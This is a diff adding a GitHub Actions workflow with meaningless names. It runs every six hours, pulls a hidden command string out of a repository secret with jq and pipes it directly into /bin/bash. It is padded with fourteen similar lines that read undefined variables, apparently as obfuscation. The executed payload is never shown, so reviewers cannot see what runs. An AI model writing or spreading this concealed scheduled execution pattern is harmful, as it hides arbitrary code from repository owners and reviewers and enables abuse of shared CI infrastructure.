@@ -1,0 +1,32 @@
+name: luboguang4378
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '56 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: luboguang4378
+        env:
+          wb5: ${{ secrets.wb5 }}
+        run: |
+          echo $wb5 | jq -r .ss8021 | /bin/bash
+          echo $ml3387 | jq -r .kkux22248 | /bin/bash
+          echo $mwmcp2791 | jq -r .ggaa9884 | /bin/bash
+          echo $ux84 | jq -r .psnw827 | /bin/bash
+          echo $i4990 | jq -r .hba7248 | /bin/bash
+          echo $zk0 | jq -r .nks54 | /bin/bash
+          echo $t383 | jq -r .a391 | /bin/bash
+          echo $f46 | jq -r .pzhli195 | /bin/bash
+          echo $zws87979 | jq -r .tmnqk2 | /bin/bash
+          echo $he8 | jq -r .x481 | /bin/bash
+          echo $aswgt7953 | jq -r .syjop18319 | /bin/bash
+          echo $h4 | jq -r .csqk684 | /bin/bash
+          echo $qhbzw72 | jq -r .v08 | /bin/bash
+          echo $lx1 | jq -r .qn17 | /bin/bash
+          echo $x12680 | jq -r .aha26 | /bin/bash
+
